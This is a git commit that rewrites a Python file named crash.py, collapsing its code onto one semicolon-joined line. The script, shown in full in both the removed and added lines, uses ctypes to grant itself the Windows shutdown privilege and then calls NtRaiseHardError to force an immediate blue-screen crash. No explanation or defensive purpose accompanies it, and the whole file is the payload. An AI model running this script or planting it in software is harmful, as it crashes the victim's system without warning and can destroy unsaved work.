3aca55bc00cdc5154dae759f6a104308db007b6f
Wolf <104740545+Wolf-py@users.noreply.github.com>
2022-09-22 18:26:00 +0200

    Update crash.py

--- crash.py
+++ crash.py
@@ -1,6 +1,1 @@
-from random import randint;import ctypes;import time
-ntdll = ctypes.windll.ntdll
-prev_value = ctypes.c_bool()
-res = ctypes.c_ulong()
-ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
-ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res))
+from random import randint;import ctypes;import time;ntdll = ctypes.windll.ntdll;prev_value = ctypes.c_bool();res = ctypes.c_ulong();ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value));ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res))
